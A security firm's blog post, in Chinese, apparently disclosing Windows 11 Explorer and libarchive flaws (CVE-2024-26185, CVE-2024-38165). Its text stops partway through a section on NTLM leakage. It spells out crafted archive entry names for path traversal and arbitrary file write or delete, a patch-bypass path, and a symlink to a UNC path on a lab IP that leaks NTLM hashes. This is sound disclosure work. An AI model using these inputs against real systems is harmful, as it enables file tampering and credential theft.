

<!DOCTYPE html>
<html class="no-js sub-menu">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta charset="utf-8" />
    <link href="/images/favicon.png" rel="icon" size="32x32">
    <!-- web fullscreen -->
    <meta name="apple-mobile-web-app-capable" content="yes"><!-- ios -->
    <meta name="mobile-web-app-capable" content="yes"><!-- android -->
    <meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=0" />
    <meta name="format-detection" content="telephone=no">
    <title>全境擴散：從 Windows 11 到 Libarchive 的 Half-Day 威脅與全面影響 | DEVCORE 戴夫寇爾</title>
    <link rel="stylesheet" href="/css/style.css" />
    <script src="/js/modernizr-custom.js"></script>
    <script src="/js/jquery-3.6.0.min.js"></script>
    <script src="/js/site.js"></script>
    <meta name="description" property="og:description" content="Windows 11 的 KB5031455 更新讓檔案總管支援 RAR、7z 等格式，看似提升便利性，卻暗藏資安隱患。DEVCORE 研究組發現 libarchive 存在多個漏洞，包括 Heap Buffer Overflow、任意檔案寫入與刪除，而修補機制的延遲更導致「Half-day」攻擊風險。攻擊者可藉此影響如 ClickHouse 等廣泛使用 libarchive 的專案。Windows 真的變得更方便，還是埋下了更大的風險？" />
    <meta name="keywords" content="CVE-2024-26185, CVE-2024-38165, CVE-2024-48957, CVE-2024-48958" />
    <meta property="og:site_name" content="DEVCORE 戴夫寇爾" />
    <meta property="og:title" content="全境擴散：從 Windows 11 到 Libarchive 的 Half-Day 威脅與全面影響 | DEVCORE 戴夫寇爾" />
    <meta property="og:url" content="https://devco.re/blog/2025/02/12/from-convenience-to-contagion-the-half-day-threat-and-libarchive-vulnerabilities-lurking-in-windows-11/" />
    <meta property="og:type" content="website" />
    <meta property="og:image" content="https://devco.re/assets/img/blog/20250212/cover.png" />
    <meta name="twitter:card" content="summary">
    <meta name="twitter:site" content="d3vc0r3">
    <meta name="twitter:title" content="全境擴散：從 Windows 11 到 Libarchive 的 Half-Day 威脅與全面影響 | DEVCORE 戴夫寇爾">
    <meta name="twitter:description" content="Windows 11 的 KB5031455 更新讓檔案總管支援 RAR、7z 等格式，看似提升便利性，卻暗藏資安隱患。DEVCORE 研究組發現 libarchive 存在多個漏洞，包括 Heap Buffer Overflow、任意檔案寫入與刪除，而修補機制的延遲更導致「Half-day」攻擊風險。攻擊者可藉此影響如 ClickHouse 等廣泛使用 libarchive 的專案。Windows 真的變得更方便，還是埋下了更大的風險？">
    <meta name="twitter:creator" content="d3vc0r3">
    <meta name="twitter:image:src" content="https://devco.re/assets/img/blog/20250212/cover.png">
    <meta name="twitter:domain" content="devco.re">
    <meta name="google-site-verification" content="lMNi_XT6UmeGqeYI_vLHu5PDRi_uNVfnA2NdDGS4-lM" />
    <meta name="msvalidate.01" content="119FDBB7730BE45B162515BBB1FF6B33" />
    <meta name="alexaVerifyID" content="j-Es9N9SD7ckfA2EokOz9SZzhok" />
    <meta name='yandex-verification' content='4561963cf1d18fe3' />
    <meta property="fb:admins" content="120968921404653" />

    <link rel="canonical" href="https://devco.re/blog/2025/02/12/from-convenience-to-contagion-the-half-day-threat-and-libarchive-vulnerabilities-lurking-in-windows-11/"/>
    <link rel="alternate" type="application/rss+xml" title="DEVCORE 戴夫寇爾" href="https://devco.re/rss">

    <!-- Google tag (gtag.js) -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-GHXJ9PS005"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());

      gtag('config', 'G-GHXJ9PS005');
    </script>
    <link rel="stylesheet" href="/fonts/inter.css" />
    <link rel="stylesheet" href="/css/highlighter.css" />
    <!-- <script src="https://cdn.jsdelivr.net/gh/google/code-prettify@master/loader/run_prettify.js"></script> -->
</head>
<body>
    <!-- 導覽列 start -->
    <header class="header">
<div class="container">
    <!-- logo start -->
    <div class="logo">
        <a href="/">
            <img src="/images/logo.svg"/>
        </a>
    </div>
    <!-- logo end -->
    <!-- 主選單 start -->
    <nav class="nav">
        <ul class="menu">
            <li class="dropdown">
                <div class="menuLable">
                    <span>服務<i class="icon arrow_down"></i></span>

                    <div class="menuItem">
                        <a href="/services/red-team/">
                            <div class="item">

                                <h2>
                                    <i class="icon menu service-red-team"></i>
                                    紅隊演練
                                </h2>
                                <p class="two-line">
                                    在不影響企業營運前提下，無所不用其極，從各種進入點執行模擬入侵攻擊，達成企業指定的演練情境。
                                </p>
                            </div>
                        </a>
                        <a href="/services/penetration-test/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu service-penetration-test"></i>
                                    滲透測試
                                </h2>
                                <p class="two-line">
                                    以駭客思維及手法嘗試入侵企業指定系統，找出潛在漏洞，驗證企業資料與設備是否可被竊取或破壞。
                                </p>
                            </div>
                        </a>
                        <a href="/services/security-consulting/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu service-security-consulting"></i>
                                    資安顧問服務
                                </h2>
                                <p class="two-line">
                                    以紅隊演練為基礎，提供攻擊者視角與可能入侵路徑，協助企業評估資安資源優先順序，並擬定長期防禦策略。
                                </p>
                            </div>
                        </a>
                        <a href="/services/security-training/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu service-security-training"></i>
                                    資安教育訓練
                                </h2>
                                <p class="two-line">
                                    從攻擊思維出發，協助企業有效預防資安事故並防禦；以及事件發生時，如何快速判定攻擊目的、手法、漏洞與及應變方式。
                                </p>
                            </div>
                        </a>

                    </div>
                </div>
            </li>

            <li class="dropdown">
                <div class="menuLable">
                    <span>研究<i class="icon arrow_down"></i></span>

                    <div class="menuItem">
                        <a href="/research/overview/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu search-circle"></i>
                                    總覽概要
                                </h2>
                                <p class="two-line">
                                    持續精研資安最新技術及漏洞研究趨勢，全方位檢測企業產品安全性、吸取經驗並轉化為紅隊演練工具與手法。
                                </p>
                            </div>
                        </a>
                        <a href="/research/awards/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu badge-check"></i>
                                    競賽與獎項
                                </h2>
                                <p class="two-line">
                                    國際級資訊安全競賽獎項肯定。
                                </p>
                            </div>
                        </a>
                        <a href="/research/bug-bounty/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu puzzle"></i>
                                    企業漏洞回報
                                </h2>
                                <p class="two-line">
                                    研究企業系統中的資安風險及各種可能的突破口，並通報企業修補。
                                </p>
                            </div>
                        </a>
                        <a href="/research/talks/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu globe"></i>
                                    國際研討會
                                </h2>
                                <p class="two-line">
                                    參與全球資安盛會，發表、交流漏洞的知識與資訊。
                                </p>
                            </div>
                        </a>
                        <a href="/research/cve/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu view-list"></i>
                                    CVE 漏洞列表
                                </h2>
                                <p class="two-line">
                                    挖掘並回報國際知名產品與服務的重大漏洞。
                                </p>
                            </div>
                        </a>
                    </div>
                </div>


            </li>

            <li class="dropdown">
                <div class="menuLable" href="#">
                    <span>公司<i class="icon arrow_down"></i></span>

                    <div class="menuItem">
                        <a href="/company/about/">
                        <div class="item">
                            <h2>
                                <i class="icon menu company"></i>
                                公司簡介
                            </h2>
                            <p>
                                DEVCORE 戴夫寇爾由世界級白帽駭客團隊創立，提供紅隊演練、滲透測試、資安顧問服務、資安教育訓練等服務。
                            </p>
                        </div>
                        </a>
                        <a href="/company/our-team/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu team"></i>
                                    團隊成員
                                </h2>
                                <p class="two-line">
                                    由熱衷挑戰、具備駭客思維的資安專家組成，專注於創新攻擊手法研究，並以「高道德、高自律、高嚴謹」為最高指導原則。
                                </p>
                            </div>
                        </a>
                        <a href="/company/history/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu milestone"></i>
                                    成就與沿革
                                </h2>
                                <p class="two-line">
                                    長期聚焦於攻擊研究，屢屢獲邀參與全球知名資安研討會，已揭露數百個重要產品漏洞、協助企業提升防禦能量。
                                </p>
                            </div>
                        </a>
                        <a href="/company/csr/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu heart"></i>
                                    企業社會責任
                                </h2>
                                <p class="two-line">
                                    提供多元實習管道和研習計畫，提升新世代人才資安能量，推廣資訊安全意識。
                                </p>
                            </div>
                        </a>
                        <a href="/company/jobs/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu briefcase"></i>
                                    工作機會
                                </h2>
                                <p class="two-line">
                                    加入 DEVCORE，共同改善資安產業結構，與我們一起打造更安全的世界。
                                </p>
                            </div>
                        </a>
                        <a href="https://conf.devco.re/" target="_blank">
                            <div class="item">
                                <h2>
                                    <i class="icon menu conference"></i>
                                    攻擊導向技術研討會 <i class="icon open-in-new"></i>
                                </h2>
                                <p class="two-line">
                                    由 DEVCORE 舉辦的技術研討會，聚焦於技術並由駭客視角出發，帶您探索創新的攻擊技術與手法，從攻擊思考防禦的策略。
                                </p>
                            </div>
                        </a>
                    </div>
                </div>
            </li>
            <li class="dropdown">
                <div class="menuLable">
                    <span>新聞<i class="icon arrow_down"></i></span>
                    <div class="menuItem">
                        <a href="/blog/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu newspaper"></i>
                                    BLOG
                                </h2>
                                <p>
                                    DEVCORE 最新消息。
                                </p>
                            </div>
                        </a>
                        <a href="/media-kit/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu download"></i>
                                    媒體素材下載
                                </h2>
                                <p>
                                    使用 DEVCORE 商標須遵循的使用規範。
                                </p>
                            </div>
                        </a>
                    </div>
                </div>
            </li>
            <li>
                <a class="menuLable" href="/search/">搜尋</a>
            </li>
            <li>
                <a class="menuLable" href="/contact/">聯絡我們</a>
            </li>
        </ul>
    </nav>
    <!-- 主選單 end -->
</div>


<!-- 手機板選單  start-->
<nav class="nav-m" id="menu-m">
    <ul class="menu">
        <li>
            <div class="menuLable">
                <span>服務</span>
                <div class="menuItem">
                    <a href="/services/red-team/" class="fullwidth">
                        <div class="item">
                            <h2>
                                <i class="icon service-red-team"></i>
                                紅隊演練
                            </h2>
                        </div>
                    </a>
                    <a href="/services/penetration-test/" class="fullwidth">
                        <div class="item">
                            <h2>
                                <i class="icon service-penetration-test"></i>
                                滲透測試
                            </h2>
                        </div>
                    </a>
                    <a href="/services/security-consulting/" class="fullwidth">
                        <div class="item">
                            <h2>
                                <i class="icon service-security-consulting"></i>
                                顧問服務
                            </h2>
                        </div>
                    </a>
                    <a href="/services/security-training/" class="fullwidth">
                        <div class="item">
                            <h2>
                                <i class="icon service-security-training"></i>
                                教育訓練
                            </h2>
                        </div>
                    </a>
                </div>
            </div>
        </li>
        <li>
            <div class="menuLable">
                <span>資安研究</span>
                <div class="menuItem">
                    <a href="/research/overview/" class="fullwidth">
                        <div class="item">
                            <h2>總覽概要</h2>
                        </div>
                    </a>
                    <a href="/research/awards/">
                        <div class="item">
                            <h2>競賽與獎項</h2>
                        </div>
                    </a>
                    <a href="/research/bug-bounty/">
                        <div class="item">
                            <h2>Bug Bounty</h2>
                        </div>
                    </a>
                    <a href="/research/talks/">
                        <div class="item">
                            <h2>國際研討會</h2>
                        </div>
                    </a>
                    <a href="/research/cve/">
                        <div class="item">
                            <h2>CVE 漏洞列表</h2>
                        </div>
                    </a>
                </div>
            </div>
        </li>

        <li>
            <div class="menuLable">
                <span>公司</span>
                <div class="menuItem">
                    <a href="/company/about/" class="fullwidth">
                        <div class="item">
                            <h2>公司簡介</h2>
                        </div>
                    </a>
                    <a href="/company/our-team/">
                        <div class="item">
                            <h2>團隊成員</h2>
                        </div>
                    </a>
                    <a href="/company/history/">
                        <div class="item">
                            <h2>成就與沿革</h2>
                        </div>
                    </a>
                    <a href="/company/csr/">
                        <div class="item">
                            <h2>企業社會責任</h2>
                        </div>
                    </a>
                    <a href="/company/jobs/">
                        <div class="item">
                            <h2>工作機會</h2>
                        </div>
                    </a>
                    <a href="https://conf.devco.re/" target="_blank">
                        <div class="item">
                            <h2>DEVCORE CONFERENCE</h2>
                        </div>
                    </a>
                </div>
            </div>
        </li>
        <li>
            <div class="menuLable">
                <span>新聞</span>
                <div class="menuItem">
                    <!-- <a href="/blog/">
                    <div class="item">
                        <h2>所有文章</h2>
                    </div>
                    </a> -->
                    <!-- <a href="">
                        <div class="item">
                            <h2>案例剖析</h2>
                        </div>
                    </a> -->
                    <!-- <a href="">
                        <div class="item">
                            <h2>科普文章</h2>
                        </div>
                    </a>
                    <a href="">
                        <div class="item">
                            <h2>技術專欄</h2>
                        </div>
                    </a>
                    <a href="">
                        <div class="item">
                            <h2>資安新聞</h2>
                        </div>
                    </a> -->
                    <a href="/blog/">
                        <div class="item">
                            <h2>BLOG</h2>
                        </div>
                    </a>
                    <a href="/media-kit/">
                        <div class="item">
                            <h2>媒體素材下載</h2>
                        </div>
                    </a>
                </div>
            </div>
        </li>
        <li>
            <div class="menuLable">
                <div class="menuItem">
                    <a href="/search/" class="fullwidth">
                        <div class="item">
                            <h2 class="center">
                                <i class="icon search"></i>
                                搜尋
                            </h2>
                        </div>
                    </a>
                    <a href="/contact/" class="fullwidth">
                        <div class="item">
                            <h2 class="center">
                                <i class="icon chat-alt"></i>
                                聯絡我們
                            </h2>
                        </div>
                    </a>
                </div>
            </div>
        </li>
        <li>
            <div class="menuLable">
                <span><i class="icon translate"></i>Language</span>
                <div class="menuItem">
                    <a href="/">
                    <div class="item">
                        <h2>中文</h2>
                    </div>
                    </a>
                    <a href="/en">
                        <div class="item">
                            <h2>English</h2>
                        </div>
                    </a>
                </div>
            </div>
        </li>
    </ul>
</nav>
<!-- 手機板選單  end-->
    </header>
    <!-- 導覽列 end -->

    <!-- tab 選單 start -->
    <div class="sub-nav">
        <div class="container">
            <h1>BLOG</h1>
            <ul class="tab">
                <li>
                    <a href="/blog/">所有文章</a>
                </li>
                <li>
                    <a href="/blog/category/最新消息/">最新消息</a>
                </li>
                <li>
                    <a href="/blog/category/技術專欄/">技術專欄</a>
                </li>
                <li>
                    <a href="/blog/category/科普文章/">科普文章</a>
                </li>
                <li>
                    <a href="/blog/category/資安新聞/">資安新聞</a>
                </li>
                <li>
                    <a href="/media-kit/">媒體素材下載</a>
                </li>
            </ul>
        </div>
    </div>
    <!-- tab 選單 end -->
    
    <div class="main">
        <!-- 文章外層layer -->
        <section class="narrow">
            <!-- 文章 start -->
            <article class="article_body">
                <div class="content">
                    <a class="category" href="/blog/category/技術專欄">技術專欄</a>
                    <span class="tag">

                      <a href="/blog/tag/Vulnerability/">#Vulnerability</a> <a href="/blog/tag/Windows/">#Windows</a> <a href="/blog/tag/Advisory/">#Advisory</a> <a href="/blog/tag/CVE/">#CVE</a> 
                    </span>
                    <h1>
                        全境擴散：從 Windows 11 到 Libarchive 的 Half-Day 威脅與全面影響
                    </h1>
                    
                    
                    <div class="author_detail">
                        <span class="avatar">
                            <a href="/blog/author/terrynini">
                                <div class="circle">
                                    <i class="user" style="background-image: url('/assets/img/avatar/orig/nini.png');" ></i>
                                </div>
                            </a>
                        </span>
                        <span class="author"><a href="/blog/author/terrynini">Terrynini</a></span>
                        <span class="date">2025-02-12</span>
                    </div>
                    
                    
                    <div class="article_img">
                        <img src="https://devco.re/assets/img/blog/20250212/cover.png"/>
                    </div>
                    

                    <hr>

                    <!-- 文章內容 -->
                    <div class="article_content">
<h2 id="摘要">摘要</h2>
<p>Windows 11 在 2023 年 10 月發布的更新中，新增了對 RAR、7z 等多達 11 種壓縮格式的支援，使用者可以在原生的檔案總管內操作這些格式的檔案，大幅提升了便利性。然而，這一改進同時也引入了潛在的資安風險。Windows 11 使用老牌開源專案 libarchive 來實現多種壓縮格式的支援，該專案被廣泛使用在 Linux、BSD、macOS 等作業系統，以及 ClickHouse、Homebrew、Osquery 等等知名大型專案中。自 2016 起，Google 的 OSS-Fuzz 專案便 24 小時不間斷地對其進行模糊測試，是歷經時間考驗的函式庫。</p>

<p>然而，在 OSS-Fuzz 執行的模糊測試中，libarchive 的覆蓋率並不理想。除了 Microsoft Offensive Research &amp; Security Engineering (MORSE) 在 2024 年 1 月自行揭露的兩個遠端程式碼執行漏洞（RCE）之外，我們仍透過程式碼審查與模糊測試發現了 libarchive 中的數個弱點。其中包括位於 RAR 解壓縮程式碼中的 Heap Buffer Overflow 漏洞，以及因 Windows 未對 libarchive 的執行結果進行妥善檢查，導致的任意檔案寫入和任意檔案刪除的漏洞。此外，我們也將在本文中揭露 libarchive 與 Windows 結合後產生的諸多神奇特性。</p>

<p>而每當 libarchive 這類廣泛使用的函式庫存在弱點時，其風險往往滲透到各個層面，影響難以估計。加上當 Microsoft 為 Windows 進行修補時，相應的 patch 並不會立即回饋到 libarchive 中，這使得攻擊者能夠通過分析 patch 找出漏洞位置，並在漏洞修補的空窗期，利用該漏洞對其他使用 libarchive 的專案進行攻擊。所以最後，我們將以 ClickHouse 為例，說明如何在 libarchive 尚未獲得修補時，在看似不受影響的 ClickHouse 中觸發尚未修補的漏洞。</p>

<h2 id="introduction">Introduction</h2>

<p>在 Windows 11 的 KB5031455 更新之前，Windows 原生僅支援 ZIP 格式的壓縮檔案。ZIP 在檔案總管中顯示的類型是「Compressed (zipped) Folder」，使用者可以直接點兩下 ZIP 來查看其包含什麼檔案，甚至可以直接開啟檔案或是加入新的檔案。</p>

<p><img src="/assets/img/blog/20250212/1.png" alt="" /></p>

<p>「Compressed (zipped) Folder」讓使用者可以在不解壓縮的情況下瀏覽壓縮檔案內的清單，並且對檔案點兩下就可以直接使用，例如直接點擊兩下開啟文字檔案：
<img src="/assets/img/blog/20250212/2.png" alt="" /></p>

<p>這是因為當使用者點兩下壓縮檔案內的檔案時，檔案總管會將該檔案解壓縮到 <code class="language-plaintext highlighter-rouge">%TEMP%</code> 目錄下的一個以隨機 UUID 命名的暫存資料夾中，實際上是從該暫存位置開啟檔案。由於這是暫存檔案，稍後會自動刪除：
<img src="/assets/img/blog/20250212/3.png" alt="" /></p>

<h3 id="compressed-archived-folder">Compressed Archived folder</h3>

<p>接著，Windows 11 在 2023 年 10 月的 KB5031455 更新之後支援了 11 種新的壓縮檔案格式：</p>

<p><img src="/assets/img/blog/20250212/4.png" alt="" /></p>

<p>此類的檔案在檔案總管中顯示的類型是「Compressed Archive Folder」：</p>

<p><img src="/assets/img/blog/20250212/5.png" alt="" /></p>

<p>由於非常好奇 Windows 11 是透過什麼方式來支援這 11 種新的壓縮格式，我們開始分析檔案總管以及相關的 DLL 檔案。檔案總管對 ZIP 的原生支援是由 <code class="language-plaintext highlighter-rouge">zipfldr.dll</code> 這支 DLL 所負責的。在 KB5031455 更新之後，<code class="language-plaintext highlighter-rouge">zipfldr.dll</code> 中多出了一個叫做 <code class="language-plaintext highlighter-rouge">ArchiveFolder</code> 的 Class，有別於原本用以支援 ZIP 的 <code class="language-plaintext highlighter-rouge">CZipFolder</code> Class。</p>

<p><img src="/assets/img/blog/20250212/6.png" alt="" /></p>

<h3 id="第一個漏洞cve-2024-26185">第一個漏洞：CVE-2024-26185</h3>

<p>在進行逆向分析之前，我們首先對新的「Compressed Archive Folder」進行了簡單的黑箱測試。講到壓縮檔案，那絕對要測試一下 <code class="language-plaintext highlighter-rouge">../</code>。</p>

<p>第一次測試，我們構造一個名稱為 <code class="language-plaintext highlighter-rouge">..\poc.txt</code> 的檔案，並壓縮成 <code class="language-plaintext highlighter-rouge">.rar</code>，接著上傳至 Windows 主機後點兩下進行瀏覽。結果是，我們僅會在檔案總管中看到一個空的資料夾，並沒有造成任何 Path Traversal：</p>

<p><img src="/assets/img/blog/20250212/7.png" alt="" /></p>

<p>第二次測試，構造一個名稱為 <code class="language-plaintext highlighter-rouge">123\..\poc.txt</code> 的檔案，並壓縮成 <code class="language-plaintext highlighter-rouge">rar</code>，上傳至 Windows 主機後點兩下進行瀏覽。因為 <code class="language-plaintext highlighter-rouge">..</code> 與 <code class="language-plaintext highlighter-rouge">123</code> 抵銷的關係，只會在檔案總管中看到 <code class="language-plaintext highlighter-rouge">poc.txt</code> 一個檔案：</p>

<p><img src="/assets/img/blog/20250212/8.png" alt="" /></p>

<p>而 <code class="language-plaintext highlighter-rouge">%TEMP%</code> 中對應的暫存檔案也並未逃逸至上層目錄：
<img src="/assets/img/blog/20250212/9.png" alt="" /></p>

<p>除了點兩下互動之外，在檔案總管中對「Compressed (zipped) Folder」或是 「Compressed Archive Folder」類型的檔案按右鍵可以看到 <code class="language-plaintext highlighter-rouge">Extract All</code> 的選項，這個選項會嘗試將整個壓縮檔案解壓縮，透過這個選項我們再進行一次測試。</p>

<p>這次，<code class="language-plaintext highlighter-rouge">..\poc.txt</code> 被認為會逃逸到上層目錄，所以檔案總管給出一個 Error：
<img src="/assets/img/blog/20250212/10.png" alt="" /></p>

<p><code class="language-plaintext highlighter-rouge">123\..\poc.txt</code> 則解壓縮成功，但一樣只會解壓縮出 <code class="language-plaintext highlighter-rouge">poc.txt</code>
<img src="/assets/img/blog/20250212/11.png" alt="" /></p>

<p>由於 <code class="language-plaintext highlighter-rouge">Extract All</code> 是直接解壓縮整個檔案，因此我們認為「當檔案包含絕對路徑時」也需要測試一下：
<img src="/assets/img/blog/20250212/12.png" alt="" /></p>

<p>可以發現，透過 <code class="language-plaintext highlighter-rouge">Extract All</code> 解壓縮確實有包含資料夾，不過，資料夾 <code class="language-plaintext highlighter-rouge">C:</code> 被重新命名成了 <code class="language-plaintext highlighter-rouge">C_</code> 資料夾。因此我們可以知道，<code class="language-plaintext highlighter-rouge">zipfldr.dll</code> 有對特殊字元進行處理來避免解壓縮時的 Path Traversal 與 Arbitrary File Write。
<img src="/assets/img/blog/20250212/13.png" alt="" /></p>

<p>但當我們「點兩下」包含絕對路徑的 RAR 檔案進行測試時，卻看到一個叫做 <code class="language-plaintext highlighter-rouge">Local Disk (C:)</code> 的資料夾！<code class="language-plaintext highlighter-rouge">C:</code> 並沒有被替換成 <code class="language-plaintext highlighter-rouge">C_</code>！</p>

<p><img src="/assets/img/blog/20250212/14.png" alt="" /></p>

<p>如果我們進到資料夾的最內層，並且把 <code class="language-plaintext highlighter-rouge">poc.txt</code> 檔案打開，看似一切正常：
<img src="/assets/img/blog/20250212/15.png" alt="" /></p>

<p>但其實，<code class="language-plaintext highlighter-rouge">C:</code> 下多出了不應該存在的 <code class="language-plaintext highlighter-rouge">poc</code> 資料夾！
<img src="/assets/img/blog/20250212/16.png" alt="" /></p>

<p>表示檔案總管誤認為此處是用來暫放檔案的地方，因此 <code class="language-plaintext highlighter-rouge">poc</code> 資料夾中也包含我們剛才打開的 <code class="language-plaintext highlighter-rouge">poc.txt</code> 檔案：
<img src="/assets/img/blog/20250212/17.png" alt="" /></p>

<p>也就是說，我們找到了一個 Arbitrary File Write 的漏洞！且由於寫入的目的是放置暫存檔案來進行互動，所以在經過一段時間或是使用者結束瀏覽時就會被刪除，因此我們實際上找到的是一個任意檔案寫/刪除的漏洞。不過稍微稍微可惜的是，任意檔案寫與任意檔案刪除所使用的權限是當前使用者的權限。</p>

<p>這就是 <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-26185">CVE-2024-26185</a>：一個好笑但沒什麼用處的漏洞。因為如果要利用此漏洞創建或刪除特定位置的檔案，那就必須在壓縮檔中建立出相同的路徑，接著還需要誘騙使用者打開所有資料夾後，點擊兩下目標檔案才行，正常人點到一半就會覺得哪裡怪怪的了。</p>

<p>話是這麼說，但根據規則，微軟還是得付我 1,000 美金，好耶。
<img src="/assets/img/blog/20250212/18.png" alt="" /></p>

<h3 id="cve-2024-26185成因">CVE-2024-26185：成因</h3>

<p>剛才發現的 CVE-2024-26185，成因是因為沒有正確的對檔案名稱進行過濾。逆向之後我們發現，在 <code class="language-plaintext highlighter-rouge">zipfldr.dll</code> 中，進行解壓縮之前會呼叫 <code class="language-plaintext highlighter-rouge">replace_invalid_path_chars</code> 進行過濾。這個 function 將 <code class="language-plaintext highlighter-rouge">"*:&lt;&gt;?|</code> 等字元替換為 <code class="language-plaintext highlighter-rouge">_</code>、將 <code class="language-plaintext highlighter-rouge">/</code> 替換成 <code class="language-plaintext highlighter-rouge">\</code>。此外，與「Compressed (zipped) Folder」或 「Compressed Archive Folder」互動時，使用者總共有三個方式可以進行解壓縮，這三個行為各自觸發了不同的 function，分別是：</p>

<ul>
  <li>點兩下壓縮檔案中的檔案
    <ul>
      <li>觸發 <code class="language-plaintext highlighter-rouge">ExtractFromArchiveByIndex</code></li>
    </ul>
  </li>
  <li>點兩下壓縮檔案中的 cmd、bat、exe 檔案
    <ul>
      <li>觸發 <code class="language-plaintext highlighter-rouge">ExtractEntireArchive</code></li>
    </ul>
  </li>
  <li>對壓縮檔案點擊右鍵，點擊選單中的「Extract All」
    <ul>
      <li>觸發 <code class="language-plaintext highlighter-rouge">ArchiveExtractWizard::ExtractToDestination</code></li>
    </ul>
  </li>
</ul>

<p>逆向這些函數之後我們發現，它們都使用 <code class="language-plaintext highlighter-rouge">archive_read_next_header</code> 取得壓縮檔內的檔案名稱，並呼叫 <code class="language-plaintext highlighter-rouge">replace_invalid_path_chars</code> 對名稱進行過濾。但卻忘記在「點兩下壓縮檔案中的檔案」對應的 <code class="language-plaintext highlighter-rouge">ExtractFromArchiveByIndex</code> 中做這件事情，導致任意檔案寫、任意檔案刪除的發生。</p>

<p><img src="/assets/img/blog/20250212/19.png" alt="" /></p>

<h3 id="cve-2024-38165-繞過-cve-2024-26185-的修補">CVE-2024-38165： 繞過 CVE-2024-26185 的修補</h3>

<p>在微軟修復 CVE-2024-26185 之後，我們稍微對 patch 進行了檢查，隨機的執行了一些 PoC，結果發現其中一些還是可以繞過 Windows 最新的 patch，讓我們來看看微軟是怎麼修復上一個漏洞的。</p>

<p>在 patch 之後，可以發現微軟在 <code class="language-plaintext highlighter-rouge">ExtractFromArchiveByIndex</code> 之前加入了 <code class="language-plaintext highlighter-rouge">replace_invalid_path_chars</code> 來對傳入的路徑進行過濾，看起來沒什麼問題。
<img src="/assets/img/blog/20250212/20.png" alt="" /></p>

<p>但實際上，我們可以透過檔案名稱為 <code class="language-plaintext highlighter-rouge">\poc\poc.txt</code> 的檔案繞過這個保護。首先 <code class="language-plaintext highlighter-rouge">\poc\poc.txt</code> 會先被傳入 <code class="language-plaintext highlighter-rouge">replace_invalid_path_chars</code> 進行過濾，但由於名稱中不包含任何非法字元所以沒有產生變化：</p>

<p><img src="/assets/img/blog/20250212/21.png" alt="" /></p>

<p>接下來，由於目前<code class="language-plaintext highlighter-rouge">zipfldr.dll</code> 正在做的事情是「將檔案解壓縮至 <code class="language-plaintext highlighter-rouge">%TEMP%</code> 下的資料夾，讓使用者與檔案互動」，因此 <code class="language-plaintext highlighter-rouge">zipfldr.dll</code> 需要將 <code class="language-plaintext highlighter-rouge">%TEMP%</code> 下的暫存資料夾路徑和我們提供的檔案名稱串接起來：
<img src="/assets/img/blog/20250212/22.png" alt="" /></p>

<p>在 Windows 中，開頭為 <code class="language-plaintext highlighter-rouge">C:\</code> 或是 <code class="language-plaintext highlighter-rouge">\</code> 開頭的路徑都被視為根路徑，所以實際上，<code class="language-plaintext highlighter-rouge">zipfldr.dll</code> 正在串接兩個絕對路徑。而根據 <a href="https://github.com/microsoft/STL/blob/90820002693fe6eaaec2e55884472c654186207e/stl/inc/filesystem#L723">Path 的串接在 Windows 上的實作</a>，若遇到兩個輸入都是絕對路徑時，會直接拿取第二個絕對路徑回傳，因此這個 function 的回傳值便是 <code class="language-plaintext highlighter-rouge">C:\poc\poc.txt</code>，成功繞過保護：
<img src="/assets/img/blog/20250212/23.png" alt="" /></p>

<h3 id="symlink-ntlm-exfiltration">Symlink NTLM Exfiltration</h3>

<p>在缺少 <code class="language-plaintext highlighter-rouge">replace_invalid_path_chars</code> 的情況下，我們當然可以攻擊成功。那麼，<code class="language-plaintext highlighter-rouge">replace_invalid_path_chars</code> 本身真的安全嗎？<code class="language-plaintext highlighter-rouge">replace_invalid_path_chars</code> 僅過濾 <code class="language-plaintext highlighter-rouge">"*:&lt;&gt;?|</code>。我們馬上可以發現，「<code class="language-plaintext highlighter-rouge">.</code>」是合法的字元，或許我們可以構造出遠端的路徑，導致 NTLM exfiltration 之類的問題，我們嘗試構造此類路徑：</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">\\172.23.176.34\Users\nini\Desktop\sharing\test.txt</code></li>
  <li><code class="language-plaintext highlighter-rouge">\Device\Mup\172.23.176.34\Users\nini\Desktop\sharing\test.txt</code></li>
</ul>

<p>不過在檔案為 regular file 的情況下，這頂多只會在 <code class="language-plaintext highlighter-rouge">C:</code> 之下建立相對應的目錄（在修補 CVE-2024-38165 之前才有用），無法存取遠端的檔案系統。然而，如果我們建立一個指向 <code class="language-plaintext highlighter-rouge">\\172.23.176.34\poc\poc.txt</code> 的 symlink，當使用者觸發「Extract All」或是點兩下互動時，檔案總管便會嘗試去與該 IP 的 SMB 進行互動，導致 NTLM leak:</p>

<p><img src="/assets/img/blog/20250212/24.png" alt="" /></p>

<p>並且，在尚未解壓縮前，Windows 僅使用副檔名判斷壓縮檔案內的檔案類型，欺騙性極高。以此處為例，我們的 symlink 檔案就被當作 Text Document：</p>

<p><img src="/assets/img/blog/20250212/25.png" alt="" /></p>

<p>不過，在解壓縮時，<code class="language-plaintext highlighter-rouge">zipfldr.dll</code> 是透過 <a href="https://learn.microsoft.com/zh-tw/windows/win32/api/winbase/nf-winbase-createsymboliclinka"><code class="language-plaintext highlighter-rouge">CreateSymbolicLinkA</code></a> 這個 API 來建立 symlink。呼叫的程式必須有高權限才能建立 symlink，而在解壓縮時，檔案總管並不會要求任何權限，而是直接報錯：
<img src="/assets/img/blog/20250212/26.png" alt="" /></p>

